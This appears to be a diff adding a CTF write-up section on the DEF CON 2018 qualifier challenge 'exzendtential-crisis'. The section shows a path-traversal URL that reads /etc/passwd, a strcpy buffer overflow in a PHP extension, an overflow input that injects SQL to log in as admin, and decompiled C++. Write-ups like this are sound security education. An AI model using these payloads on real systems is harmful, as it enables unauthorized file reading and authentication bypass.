@@ -1060,6 +1060,63 @@ if __name__ == '__main__':
 You can send anything as the flag !!
 `OOO{Happy Mother's Day!!}``
 
+### exzendtential-crisis (unsolved)
+
+After loggin in, we found a LFI vulnerability.
+`http://d4a386ad.quals2018.oooverflow.io/essays.php?preview&name=../../../../../etc/passwd`
+
+We retrive these files from the server:
+
+- All PHP source code, but `flag.php` is WAFed.
+- /etc/php7/apache2/php.ini (not sure, I forget the exact location)
+- /usr/lib/php/20151012/mydb.so (found the path in php.ini)
+- /var/lib/mydb/mydb.db (found the path in mydb.so)
+
+The main problem is the customized functions, `check_redential`, `get_user_id` .... Those function use PHP extension, written in C++, in `mydb.so`.
+
+A quick reverse engineering will find a interesting function `check_hacker_attempt`. You can found the source code [in the official repo](https://github.com/o-o-overflow/chall-exzendtential-crisis/blob/master/src/c/mydb.cpp#L31-L69). the `strcpy` leads to a buffer overflow. It copies a `std::string` to a 100 byte C string.
+
+Our main objective is to make `get_user_id()` return 1, which is the admin's user id. Exploiting the buffer overflow can [overwrite the table_name](https://github.com/o-o-overflow/chall-exzendtential-crisis/blob/master/src/c/mydb.cpp#L31-L69).
+
+Here is the evil input: `print("A"*112+"users where rowid=1;--")`
+
+The SQL query becomes:
+```
+select rowid from users where rowid=1;-- where username = '...' and password = '...';
+```
+
+Then the query returns 1. We are the admin now. Visit `flag.php` and get the flag!
+
+
+Postscript: We fail to solve this because the reversing of `strcyp` tends to be confusing here. The code below is equal to `strcpy`. However, we somehow missed this part :(
+
+```c++
+v5 = str_len + 1;
+if ( v5 >= 8 )
+{
+  *(_QWORD *)to_check = *(_QWORD *)username;
+  *(_QWORD *)&to_check[v5 - 8] = *(_QWORD *)&username[v5 - 8];
+  qmemcpy(
+    (void *)((unsigned __int64)(to_check + 8) & 0xFFFFFFFFFFFFFFF8LL),
+    (const void *)(username - &to_check[-((unsigned __int64)(to_check + 8) & 0xFFFFFFFFFFFFFFF8LL)]),
+    8LL * ((v5 + (_DWORD)to_check - (((_DWORD)to_check + 8) & 0xFFFFFFF8)) >> 3));
+}
+else if ( v5 & 4 )
+{
+  *(_DWORD *)to_check = *(_DWORD *)username;
+  *(_DWORD *)&to_check[v5 - 4] = *(_DWORD *)&username[v5 - 4];
+}
+else if ( v5 )
+{
+  *to_check = *username;
+  if ( v5 & 2 )
+    *(_WORD *)&to_check[v5 - 2] = *(_WORD *)&username[v5 - 2];
+}
+v12 = sub_34E0;
+v11 = (__int64 (__fastcall *)(char *, __int64, int))sub_3220;
+```
+
+
 ## Guest Chefs
 
 ### PHP Eval White-List
